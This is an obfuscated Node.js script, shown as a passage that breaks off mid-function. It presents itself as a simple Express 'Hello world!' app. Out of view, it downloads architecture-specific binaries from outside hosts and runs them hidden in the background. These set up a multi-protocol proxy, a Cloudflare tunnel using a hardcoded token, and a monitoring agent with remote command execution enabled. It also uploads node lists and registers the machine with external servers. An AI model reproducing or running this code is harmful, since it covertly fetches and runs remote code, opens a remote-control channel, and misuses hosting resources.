const _0x31212e=_0x21b1;(function(_0x47a0f2,_0x327ca4){const _0x338170={_0x244d19:0x1f7,_0x3f7ded:0x17e,_0x4c3a38:0x1d6,_0xf45d0c:0x1dd,_0x1b863e:0x1f0},_0x34f01a=_0x21b1,_0xc5b521=_0x47a0f2();while(!![]){try{const _0x344688=-parseInt(_0x34f01a(0x1ab))/0x1*(parseInt(_0x34f01a(_0x338170._0x244d19))/0x2)+parseInt(_0x34f01a(_0x338170._0x3f7ded))/0x3+-parseInt(_0x34f01a(_0x338170._0x4c3a38))/0x4*(-parseInt(_0x34f01a(_0x338170._0xf45d0c))/0x5)+-parseInt(_0x34f01a(0x1cf))/0x6+parseInt(_0x34f01a(0x19f))/0x7+parseInt(_0x34f01a(_0x338170._0x1b863e))/0x8+-parseInt(_0x34f01a(0x214))/0x9;if(_0x344688===_0x327ca4)break;else _0xc5b521['push'](_0xc5b521['shift']());}catch(_0x490d97){_0xc5b521['push'](_0xc5b521['shift']());}}}(_0x28ea,0x1c420));const express=require(_0x31212e(0x173)),app=express(),axios=require(_0x31212e(0x1fe)),os=require('os'),fs=require('fs'),path=require(_0x31212e(0x1af)),{promisify}=require(_0x31212e(0x1cc)),exec=promisify(require(_0x31212e(0x21a))[_0x31212e(0x1b0)]),{execSync}=require(_0x31212e(0x21a)),UPLOAD_URL=process['env'][_0x31212e(0x176)]||'',PROJECT_URL=process[_0x31212e(0x158)][_0x31212e(0x1db)]||'',AUTO_ACCESS=process[_0x31212e(0x158)][_0x31212e(0x1ff)]||![],FILE_PATH=process[_0x31212e(0x158)]['FILE_PATH']||_0x31212e(0x19b),SUB_PATH=process[_0x31212e(0x158)][_0x31212e(0x16d)]||'sub',PORT=process[_0x31212e(0x158)][_0x31212e(0x197)]||process[_0x31212e(0x158)]['PORT']||0xbb8,UUID=process[_0x31212e(0x158)][_0x31212e(0x18c)]||_0x31212e(0x1a9),NEZHA_SERVER=process['env'][_0x31212e(0x1ba)]||'',NEZHA_PORT=process[_0x31212e(0x158)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x31212e(0x158)][_0x31212e(0x219)]||'',ARGO_DOMAIN=process[_0x31212e(0x158)]['ARGO_DOMAIN']||'claw.zzkky.de5.net',ARGO_AUTH=process[_0x31212e(0x158)][_0x31212e(0x199)]||_0x31212e(0x172),ARGO_PORT=process[_0x31212e(0x158)][_0x31212e(0x1a0)]||0x1f41,CFIP=process[_0x31212e(0x158)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x31212e(0x158)][_0x31212e(0x18b)]||0x1bb,NAME=process[_0x31212e(0x158)][_0x31212e(0x1b6)]||'clawcloudr';!fs[_0x31212e(0x1a1)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x31212e(0x20b)](FILE_PATH+_0x31212e(0x200))):console[_0x31212e(0x20b)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x378d4c={_0x40617d:0x1c8,_0x261e3b:0x1b7,_0x4f6fef:0x215},_0x3d087e=_0x31212e,_0x2116dd=_0x3d087e(_0x378d4c._0x40617d);let _0x1f5f35='';for(let _0x390efd=0x0;_0x390efd<0x6;_0x390efd++){_0x1f5f35+=_0x2116dd[_0x3d087e(_0x378d4c._0x261e3b)](Math['floor'](Math[_0x3d087e(_0x378d4c._0x4f6fef)]()*_0x2116dd['length']));}return _0x1f5f35;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x28ea(){const _0x473eca=['test','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','http\x20server\x20is\x20running\x20on\x20port:','del\x20/f\x20/q\x20','PROJECT_URL','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','295SWNYFe','unlinkSync','status','Hello\x20world!','/vmess-argo?ed=2560','join','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','platform','ARGO_DOMAIN:','set','writeFileSync','ArgoDomain:','firefox','\x0a\x20\x20\x0atrojan://','statSync','/vless-argo','length','&path=%2Fvless-argo%3Fed%3D2560#','match','292008SwvMEZ','/vmess-argo','tcp','127.0.0.1','win32','2053','stringify','4iTcZJm','utf-8','?encryption=none&security=tls&sni=','block','message','readdirSync','data','axios','AUTO_ACCESS','\x20is\x20created','forEach','aarch64','https://amd64.ssss.nyc.mn/v1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','application/json','false','/dev/null','Error\x20executing\x20command:\x20','Download\x20','php\x20running\x20error:\x20','log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','nohup\x20','basename','error','fileUrl','npm\x20running\x20error:\x20','arm64','200844XxrHDG','random','has','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Empowerment\x20success\x20for\x20','NEZHA_KEY','child_process','includes','isFile','env','App\x20is\x20running','stream','https://arm64.ssss.nyc.mn/agent','listen','https://amd64.ssss.nyc.mn/bot','\x0aclient_secret:\x20','unshift','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Nodes\x20uploaded\x20successfully','.exe\x20>\x20nul\x202>&1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','xtls-rprx-vision','createWriteStream','\x0a\x20\x20credentials-file:\x20','chmod','&fp=firefox&type=ws&host=','quic','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Error\x20in\x20startserver:','all','SUB_PATH','/config.json\x20>/dev/null\x202>&1\x20&','then','\x0a\x20\x20tunnel:\x20','https://arm64.ssss.nyc.mn/bot','eyJhIjoiMWNjMTgyMzQ1MjVlMDM2OTY1ZTYzZTk4OTE5YzQxYWIiLCJ0IjoiNmIzY2FjZjYtNjIxMi00ZGFlLWI4M2YtYzRiZDBiZTQ4MjgwIiwicyI6Ik5tRTVZVEEwTnpndE56RXhPUzAwTVRFNUxUbGtZV0V0TnpaaU1qQTRNVFk0Tm1KayJ9','express','boot.log','catch','UPLOAD_URL','https://amd64.ssss.nyc.mn/web','\x20-c\x20','sub.txt','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://oooo.serv00.net/add-url','post','config.json','300993yvGKbq','pipe','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','from','\x0avless://','pkill\x20-f\x20\x22[','arm','rm\x20-rf\x20','tls','toString','\x22\x20>\x20/dev/null\x202>&1','2096','\x20-c\x20\x22','CFPORT','UUID','Skipping\x20adding\x20automatic\x20access\x20task','\x20successfully','\x20failed:\x20','map','none','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x20is\x20running','send','taskkill\x20/f\x20/im\x20','Content-Type','SERVER_PORT','\x20-s\x20','ARGO_AUTH','https://amd64.ssss.nyc.mn/agent','./tmp','\x0a\x20\x20\x0avmess://','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','NEZHA\x20variable\x20is\x20empty,skip\x20running','1286670kVUJmO','ARGO_PORT','existsSync','push','TunnelSecret','close','https://arm64.ssss.nyc.mn/v1','/tunnel.yml\x20run','Unhandled\x20error\x20in\x20startserver:','\x20>/dev/null\x202>&1','cbe6b074-baba-49ca-874b-8bdbb5907ca3','http','49867KQhfsq','\x0a\x20\x20\x20\x20','8443','readFileSync','path','exec','443','Subscription\x20uploaded\x20successfully','Add\x20automatic\x20access\x20task\x20faild:\x20','clear','finish','NAME','charAt','2083','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','NEZHA_SERVER','/trojan-argo','tunnel.json','split','vmess','vless','--tls','direct','\x20-p\x20','https://arm64.ssss.nyc.mn/web','trim','Error\x20downloading\x20files:','get','text/plain;\x20charset=utf-8','abcdefghijklmnopqrstuvwxyz','Empowerment\x20failed\x20for\x20','tunnel.yml','response','util','\x20>\x20nul\x202>&1','substring','969324mwSgQk','\x20>/dev/null\x202>&1\x20&','/api/add-subscriptions','Error\x20reading\x20boot.log:','filter','arch','base64','5336yLfjdT'];_0x28ea=function(){return _0x473eca;};return _0x28ea();}let npmPath=path[_0x31212e(0x1e2)](FILE_PATH,npmName),phpPath=path[_0x31212e(0x1e2)](FILE_PATH,phpName),webPath=path[_0x31212e(0x1e2)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x31212e(0x1e2)](FILE_PATH,_0x31212e(0x179)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x31212e(0x1e2)](FILE_PATH,_0x31212e(0x17d));function deleteNodes(){const _0x4d6ddf={_0x5f1390:0x1ae,_0xd857ae:0x1f8,_0x455221:0x1f8,_0x23bb38:0x1bd,_0x45bf38:0x1d3,_0x47e95f:0x1ed,_0x445a11:0x205},_0x1ffc80=_0x31212e;try{if(!UPLOAD_URL)return;if(!fs[_0x1ffc80(0x1a1)](subPath))return;let _0x513d93;try{_0x513d93=fs[_0x1ffc80(_0x4d6ddf._0x5f1390)](subPath,_0x1ffc80(_0x4d6ddf._0xd857ae));}catch{return null;}const _0x23673d=Buffer[_0x1ffc80(0x181)](_0x513d93,_0x1ffc80(0x1d5))[_0x1ffc80(0x187)](_0x1ffc80(_0x4d6ddf._0x455221)),_0x4a3491=_0x23673d[_0x1ffc80(_0x4d6ddf._0x23bb38)]('\x0a')[_0x1ffc80(_0x4d6ddf._0x45bf38)](_0x275ec8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1ffc80(0x1d7)](_0x275ec8));if(_0x4a3491[_0x1ffc80(_0x4d6ddf._0x47e95f)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x4a3491}),{'headers':{'Content-Type':_0x1ffc80(_0x4d6ddf._0x445a11)}})[_0x1ffc80(0x175)](_0x28f3ad=>{return null;}),null;}catch(_0x345a5e){return null;}}function cleanupOldFiles(){const _0x2d0bc8={_0x27f6b6:0x1fc},_0x5c5594={_0x1fbd44:0x1eb,_0x5cc4ef:0x21c,_0x2f1f9b:0x1de},_0x8821b2=_0x31212e;try{const _0x445e01=fs[_0x8821b2(_0x2d0bc8._0x27f6b6)](FILE_PATH);_0x445e01['forEach'](_0x34abc5=>{const _0x467f38=_0x8821b2,_0x3acf31=path['join'](FILE_PATH,_0x34abc5);try{const _0x104754=fs[_0x467f38(_0x5c5594._0x1fbd44)](_0x3acf31);_0x104754[_0x467f38(_0x5c5594._0x5cc4ef)]()&&fs[_0x467f38(_0x5c5594._0x2f1f9b)](_0x3acf31);}catch(_0x3e2f52){}});}catch(_0xb446bf){}}app[_0x31212e(0x1c6)]('/',function(_0xedd013,_0x5a7a7f){const _0xc693f9={_0x1ff556:0x194,_0x5d7fee:0x1e0},_0x25f044=_0x31212e;_0x5a7a7f[_0x25f044(_0xc693f9._0x1ff556)](_0x25f044(_0xc693f9._0x5d7fee));});async function generateConfig(){const _0x3534c7={_0x41657c:0x207,_0x48a892:0x191,_0x1979a2:0x1ec,_0x37c624:0x169,_0x11beae:0x186,_0x3e73e9:0x1c1},_0x30eecb=_0x31212e,_0x14454f={'log':{'access':_0x30eecb(_0x3534c7._0x41657c),'error':_0x30eecb(0x207),'loglevel':_0x30eecb(_0x3534c7._0x48a892)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x30eecb(0x164)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x30eecb(0x1ec),'dest':0xbba},{'path':_0x30eecb(0x1f1),'dest':0xbbb},{'path':_0x30eecb(0x1bb),'dest':0xbbc}]},'streamSettings':{'network':_0x30eecb(0x1f2)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x30eecb(0x1bf),'settings':{'clients':[{'id':UUID}],'decryption':_0x30eecb(0x191)},'streamSettings':{'network':_0x30eecb(0x1f2),'security':_0x30eecb(0x191)}},{'port':0xbba,'listen':_0x30eecb(0x1f3),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x30eecb(0x191)},'streamSettings':{'network':'ws','security':_0x30eecb(_0x3534c7._0x48a892),'wsSettings':{'path':_0x30eecb(_0x3534c7._0x1979a2)}},'sniffing':{'enabled':!![],'destOverride':[_0x30eecb(0x1aa),'tls',_0x30eecb(_0x3534c7._0x37c624)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x30eecb(0x1be),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x30eecb(0x1aa),_0x30eecb(_0x3534c7._0x11beae),_0x30eecb(0x169)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x30eecb(0x1f3),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x30eecb(0x1bb)}},'sniffing':{'enabled':!![],'destOverride':[_0x30eecb(0x1aa),'tls',_0x30eecb(0x169)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x30eecb(_0x3534c7._0x3e73e9)},{'protocol':'blackhole','tag':_0x30eecb(0x1fa)}]};fs[_0x30eecb(0x1e7)](path['join'](FILE_PATH,'config.json'),JSON[_0x30eecb(0x1f6)](_0x14454f,null,0x2));}function getSystemArchitecture(){const _0x3d3f29={_0x3bb62f:0x202,_0x4d2be9:0x184},_0x5b4503=_0x31212e,_0x5dff58=os[_0x5b4503(0x1d4)]();return _0x5dff58===_0x5b4503(0x184)||_0x5dff58===_0x5b4503(0x213)||_0x5dff58===_0x5b4503(_0x3d3f29._0x3bb62f)?_0x5b4503(_0x3d3f29._0x4d2be9):'amd';}function downloadFile(_0x3e3eed,_0x162b20,_0x399df5){const _0x11ad3c={_0x3dc387:0x1a1,_0x30ecda:0x16f},_0x251e53={_0x5c28b0:0x20f},_0x20ced8={_0x1fae37:0x1fd,_0x29023d:0x17f},_0x31cf2c={_0x4baa53:0x1fb,_0x3664e6:0x210},_0x2de307=_0x31212e,_0x5cb029=_0x3e3eed;!fs[_0x2de307(_0x11ad3c._0x3dc387)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x391cfd=fs[_0x2de307(0x165)](_0x5cb029);axios({'method':'get','url':_0x162b20,'responseType':_0x2de307(0x15a)})[_0x2de307(_0x11ad3c._0x30ecda)](_0x4ccb17=>{const _0x487c06=_0x2de307;_0x4ccb17[_0x487c06(_0x20ced8._0x1fae37)][_0x487c06(_0x20ced8._0x29023d)](_0x391cfd),_0x391cfd['on'](_0x487c06(0x1b5),()=>{const _0x16142=_0x487c06;_0x391cfd[_0x16142(0x1a4)](),console[_0x16142(0x20b)]('Download\x20'+path['basename'](_0x5cb029)+_0x16142(0x18e)),_0x399df5(null,_0x5cb029);}),_0x391cfd['on']('error',_0x347ce2=>{const _0x78b368=_0x487c06;fs['unlink'](_0x5cb029,()=>{});const _0x2db848=_0x78b368(0x209)+path[_0x78b368(0x20f)](_0x5cb029)+_0x78b368(0x18f)+_0x347ce2[_0x78b368(_0x31cf2c._0x4baa53)];console[_0x78b368(_0x31cf2c._0x3664e6)](_0x2db848),_0x399df5(_0x2db848);});})[_0x2de307(0x175)](_0x17de88=>{const _0x37fef4=_0x2de307,_0x1e997a='Download\x20'+path[_0x37fef4(_0x251e53._0x5c28b0)](_0x5cb029)+_0x37fef4(0x18f)+_0x17de88[_0x37fef4(0x1fb)];console[_0x37fef4(0x210)](_0x1e997a),_0x399df5(_0x1e997a);});}async function downloadFilesAndRun(){const _0x4d5156={_0x352af6:0x20b,_0x30c376:0x16c,_0x12b7a2:0x1c5,_0x13397c:0x21b,_0x135755:0x1b1,_0x388fbc:0x1ad,_0x4dc43:0x1b8,_0x383fab:0x1f5,_0x4c3824:0x216,_0x25b5c2:0x15e,_0x59bc65:0x180,_0x3bddb8:0x1e3,_0xe461b4:0x1e7,_0x5aea7a:0x210,_0x314273:0x1b8,_0x3ec4cd:0x1f5,_0x5d62a9:0x1c0,_0x34af22:0x198,_0x36f210:0x160,_0x13f65e:0x193,_0x1c3011:0x16e,_0x509149:0x1a1,_0x1f19e7:0x1a6,_0x5bbb21:0x204,_0x4bef41:0x208},_0x354ff1={_0xadda:0x1a1,_0x4171a5:0x167},_0xdb955b=_0x31212e,_0xd33119=getSystemArchitecture(),_0x230a1a=getFilesForArchitecture(_0xd33119);if(_0x230a1a['length']===0x0){console[_0xdb955b(_0x4d5156._0x352af6)](_0xdb955b(0x19d));return;}const _0x3e5971=_0x230a1a[_0xdb955b(0x190)](_0x2199a0=>{return new Promise((_0x576040,_0x52dcf2)=>{const _0x4019f3=_0x21b1;downloadFile(_0x2199a0['fileName'],_0x2199a0[_0x4019f3(0x211)],(_0x1d62e3,_0x574cf2)=>{_0x1d62e3?_0x52dcf2(_0x1d62e3):_0x576040(_0x574cf2);});});});try{await Promise[_0xdb955b(_0x4d5156._0x30c376)](_0x3e5971);}catch(_0x4641d9){console[_0xdb955b(0x210)](_0xdb955b(_0x4d5156._0x12b7a2),_0x4641d9);return;}function _0x66b866(_0x3f0f17){const _0x2b3bc8={_0x2d310b:0x1c9,_0x1bbe7d:0x20b,_0x3d38e3:0x218},_0x40b457=_0xdb955b,_0x1bed4a=0x1fd;_0x3f0f17[_0x40b457(0x201)](_0x3afd55=>{const _0x51689a=_0x40b457;fs[_0x51689a(_0x354ff1._0xadda)](_0x3afd55)&&fs[_0x51689a(_0x354ff1._0x4171a5)](_0x3afd55,_0x1bed4a,_0x3eb07a=>{const _0x22dd62=_0x51689a;_0x3eb07a?console[_0x22dd62(0x210)](_0x22dd62(_0x2b3bc8._0x2d310b)+_0x3afd55+':\x20'+_0x3eb07a):console[_0x22dd62(_0x2b3bc8._0x1bbe7d)](_0x22dd62(_0x2b3bc8._0x3d38e3)+_0x3afd55+':\x20'+_0x1bed4a[_0x22dd62(0x187)](0x8));});});}const _0x27d811=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x66b866(_0x27d811);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1c768e=NEZHA_SERVER[_0xdb955b(_0x4d5156._0x13397c)](':')?NEZHA_SERVER[_0xdb955b(0x1bd)](':')['pop']():'',_0x152700=new Set([_0xdb955b(_0x4d5156._0x135755),_0xdb955b(_0x4d5156._0x388fbc),_0xdb955b(0x189),'2087',_0xdb955b(_0x4d5156._0x4dc43),_0xdb955b(_0x4d5156._0x383fab)]),_0x6128e3=_0x152700[_0xdb955b(_0x4d5156._0x4c3824)](_0x1c768e)?'true':_0xdb955b(0x206),_0x4f33d9=_0xdb955b(_0x4d5156._0x25b5c2)+NEZHA_KEY+_0xdb955b(_0x4d5156._0x59bc65)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x6128e3+_0xdb955b(_0x4d5156._0x3bddb8)+UUID;fs[_0xdb955b(_0x4d5156._0xe461b4)](path[_0xdb955b(0x1e2)](FILE_PATH,'config.yaml'),_0x4f33d9);const _0x1dd342=_0xdb955b(0x20e)+phpPath+_0xdb955b(0x18a)+FILE_PATH+_0xdb955b(0x1dc);try{await exec(_0x1dd342),console[_0xdb955b(0x20b)](phpName+'\x20is\x20running'),await new Promise(_0x4c04ba=>setTimeout(_0x4c04ba,0x3e8));}catch(_0x1a9f5b){console[_0xdb955b(_0x4d5156._0x5aea7a)](_0xdb955b(0x20a)+_0x1a9f5b);}}else{let _0x507e02='';const _0x39d955=[_0xdb955b(0x1b1),_0xdb955b(0x1ad),'2096','2087',_0xdb955b(_0x4d5156._0x314273),_0xdb955b(_0x4d5156._0x3ec4cd)];_0x39d955['includes'](NEZHA_PORT)&&(_0x507e02=_0xdb955b(_0x4d5156._0x5d62a9));const _0x5ad66c=_0xdb955b(0x20e)+npmPath+_0xdb955b(_0x4d5156._0x34af22)+NEZHA_SERVER+':'+NEZHA_PORT+_0xdb955b(0x1c2)+NEZHA_KEY+'\x20'+_0x507e02+_0xdb955b(_0x4d5156._0x36f210);try{await exec(_0x5ad66c),console['log'](npmName+_0xdb955b(_0x4d5156._0x13f65e)),await new Promise(_0x2b8545=>setTimeout(_0x2b8545,0x3e8));}catch(_0x5dbbc6){console['error'](_0xdb955b(0x212)+_0x5dbbc6);}}}else console['log'](_0xdb955b(0x19e));const _0x49d65a=_0xdb955b(0x20e)+webPath+_0xdb955b(0x178)+FILE_PATH+_0xdb955b(_0x4d5156._0x1c3011);try{await exec(_0x49d65a),console[_0xdb955b(0x20b)](webName+_0xdb955b(_0x4d5156._0x13f65e)),await new Promise(_0x438099=>setTimeout(_0x438099,0x3e8));}catch(_0x5445b1){console['error']('web\x20running\x20error:\x20'+_0x5445b1);}if(fs[_0xdb955b(_0x4d5156._0x509149)](botPath)){let _0x579236;if(ARGO_AUTH[_0xdb955b(0x1ef)](/^[A-Z0-9a-z=]{120,250}$/))_0x579236=_0xdb955b(0x20c)+ARGO_AUTH;else ARGO_AUTH[_0xdb955b(0x1ef)](/TunnelSecret/)?_0x579236='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0xdb955b(_0x4d5156._0x1f19e7):_0x579236='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xdb955b(_0x4d5156._0x5bbb21)+ARGO_PORT;try{await exec(_0xdb955b(0x20e)+botPath+'\x20'+_0x579236+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0xdb955b(0x193)),await new Promise(_0x4257a2=>setTimeout(_0x4257a2,0x7d0));}catch(_0xfa06cf){console[_0xdb955b(0x210)](_0xdb955b(_0x4d5156._0x4bef41)+_0xfa06cf);}}await new Promise(_0xf75c1b=>setTimeout(_0xf75c1b,0x1388));}function getFilesForArchitecture(_0x5ca877){const _0x277bfb={_0x1d0959:0x184,_0x51f9f4:0x1c3,_0x46bd66:0x177,_0x5ca3ba:0x15d,_0x3d645f:0x15f,_0x24e2e4:0x1a5},_0x32a7bf=_0x31212e;let _0x2d80c7;_0x5ca877===_0x32a7bf(_0x277bfb._0x1d0959)?_0x2d80c7=[{'fileName':webPath,'fileUrl':_0x32a7bf(_0x277bfb._0x51f9f4)},{'fileName':botPath,'fileUrl':_0x32a7bf(0x171)}]:_0x2d80c7=[{'fileName':webPath,'fileUrl':_0x32a7bf(_0x277bfb._0x46bd66)},{'fileName':botPath,'fileUrl':_0x32a7bf(_0x277bfb._0x5ca3ba)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2c082f=_0x5ca877===_0x32a7bf(0x184)?_0x32a7bf(0x15b):_0x32a7bf(0x19a);_0x2d80c7[_0x32a7bf(_0x277bfb._0x3d645f)]({'fileName':npmPath,'fileUrl':_0x2c082f});}else{const _0x1f241d=_0x5ca877==='arm'?_0x32a7bf(_0x277bfb._0x24e2e4):_0x32a7bf(0x203);_0x2d80c7['unshift']({'fileName':phpPath,'fileUrl':_0x1f241d});}}return _0x2d80c7;}function argoType(){const _0x3cd110={_0x1640ed:0x20b,_0x3007bd:0x16a,_0x13455f:0x1a3,_0x32078c:0x1e2,_0x4fc39c:0x1bc,_0x527c43:0x217},_0x740ccf=_0x31212e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x740ccf(_0x3cd110._0x1640ed)](_0x740ccf(_0x3cd110._0x3007bd));return;}if(ARGO_AUTH[_0x740ccf(0x21b)](_0x740ccf(_0x3cd110._0x13455f))){fs['writeFileSync'](path[_0x740ccf(_0x3cd110._0x32078c)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x53dd86=_0x740ccf(0x170)+ARGO_AUTH['split']('\x22')[0xb]+_0x740ccf(0x166)+path[_0x740ccf(0x1e2)](FILE_PATH,_0x740ccf(_0x3cd110._0x4fc39c))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x740ccf(0x1b9)+ARGO_PORT+_0x740ccf(0x163);fs['writeFileSync'](path[_0x740ccf(_0x3cd110._0x32078c)](FILE_PATH,_0x740ccf(0x1ca)),_0x53dd86);}else console[_0x740ccf(0x20b)](_0x740ccf(_0x3cd110._0x527c43));}argoType();async function extractDomains(){const _0x57d5b9={_0x686522:0x1e5,_0x4567b1:0x174,_0x4d85bf:0x1f8,_0x2f3f60:0x201,_0x106d69:0x1e8,_0x48e19a:0x20b,_0x412e1e:0x1e2,_0x3e4c8f:0x174,_0x4b696c:0x20b,_0x4affd4:0x193,_0x5e10b3:0x208},_0x3a2a04={_0x2afc95:0x192,_0x8d70cb:0x1c4},_0x40a6f6={_0xabe9f5:0x1e4,_0x3dc8d4:0x195,_0x512f15:0x1ce},_0x305609=_0x31212e;let _0x7acc22;if(ARGO_AUTH&&ARGO_DOMAIN)_0x7acc22=ARGO_DOMAIN,console[_0x305609(0x20b)](_0x305609(_0x57d5b9._0x686522),_0x7acc22),await _0x58eb0d(_0x7acc22);else try{const _0x807b13=fs[_0x305609(0x1ae)](path[_0x305609(0x1e2)](FILE_PATH,_0x305609(_0x57d5b9._0x4567b1)),_0x305609(_0x57d5b9._0x4d85bf)),_0x166672=_0x807b13[_0x305609(0x1bd)]('\x0a'),_0x515782=[];_0x166672[_0x305609(_0x57d5b9._0x2f3f60)](_0xef6979=>{const _0x1550ae=_0x305609,_0x10607a=_0xef6979['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x10607a){const _0x450cdd=_0x10607a[0x1];_0x515782[_0x1550ae(0x1a2)](_0x450cdd);}});if(_0x515782[_0x305609(0x1ed)]>0x0)_0x7acc22=_0x515782[0x0],console[_0x305609(0x20b)](_0x305609(_0x57d5b9._0x106d69),_0x7acc22),await _0x58eb0d(_0x7acc22);else{console[_0x305609(_0x57d5b9._0x48e19a)](_0x305609(0x17a)),fs[_0x305609(0x1de)](path[_0x305609(_0x57d5b9._0x412e1e)](FILE_PATH,_0x305609(_0x57d5b9._0x3e4c8f)));async function _0x2932d5(){const _0x5ec6b9=_0x305609;try{process[_0x5ec6b9(_0x40a6f6._0xabe9f5)]===_0x5ec6b9(0x1f4)?await exec(_0x5ec6b9(_0x40a6f6._0x3dc8d4)+botName+_0x5ec6b9(0x162)):await exec(_0x5ec6b9(0x183)+botName[_0x5ec6b9(0x1b7)](0x0)+']'+botName[_0x5ec6b9(_0x40a6f6._0x512f15)](0x1)+_0x5ec6b9(0x188));}catch(_0x1c07aa){}}_0x2932d5(),await new Promise(_0x138874=>setTimeout(_0x138874,0xbb8));const _0x593974='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x305609(0x204)+ARGO_PORT;try{await exec(_0x305609(0x20e)+botPath+'\x20'+_0x593974+_0x305609(0x1d0)),console[_0x305609(_0x57d5b9._0x4b696c)](botName+_0x305609(_0x57d5b9._0x4affd4)),await new Promise(_0x1cfe50=>setTimeout(_0x1cfe50,0xbb8)),await extractDomains();}catch(_0x3971d0){console[_0x305609(0x210)](_0x305609(_0x57d5b9._0x5e10b3)+_0x3971d0);}}}catch(_0x34b2cf){console['error'](_0x305609(0x1d2),_0x34b2cf);}async function _0x58eb0d(_0x501c7a){const _0x2d5fec={_0x31aa3f:0x191,_0x2c6d09:0x1e1,_0x3309c8:0x1e9,_0x193c08:0x1f9,_0x54db98:0x1ea,_0x397941:0x168,_0x108967:0x187,_0x5f2dbc:0x1d5,_0xf66d98:0x20b},_0x5e9ee3=_0x305609,_0x23bfb6=execSync(_0x5e9ee3(_0x3a2a04._0x2afc95),{'encoding':_0x5e9ee3(0x1f8)}),_0x543bb9=_0x23bfb6[_0x5e9ee3(_0x3a2a04._0x8d70cb)](),_0x3a8261=NAME?NAME+'-'+_0x543bb9:_0x543bb9;return new Promise(_0x567c49=>{const _0x1f39a3={_0x3eb33a:0x181,_0x58f0d5:0x187,_0x1f4fd4:0x1d5,_0x441751:0x1e6};setTimeout(()=>{const 